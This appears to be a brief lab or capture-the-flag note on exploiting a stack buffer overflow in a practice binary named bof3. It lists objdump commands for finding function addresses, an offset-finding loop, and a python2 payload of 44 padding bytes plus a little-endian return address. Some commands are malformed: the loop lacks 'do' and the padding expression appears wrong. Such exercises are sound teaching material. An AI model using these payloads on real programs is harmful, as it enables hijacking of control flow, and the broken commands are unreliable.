# Buffer overflow : Return to address change
# TARGET FILE : bof3

***TASK1***
What does?<br>
:it is check function address <br>

1.objdump symbol check! <br>
Method 1 : objdump -d -M intel bof3 | grep -A20 main.: <br>
Method 2 : objdump -t bof3 |grep main <br>

***TASK2***<br>
Q.) waht does? <br>
A.) Find Offset use buffer overflow <br>
How to) <br>
:for i in {0..50}; echo $i; python -c "print 'A'$i + 'function address' "| ./bof3; done <br>

***TASK3***<br>
Q.) Payloads? <br>
A.) python2 -c "print 'a'*offset + 'function address (little endian)'" | ./target_file <br>
How to) <br>
:python2 -c "print  'a'*44 +'{function address (lttile endian) }'" | ./bof3 <br>





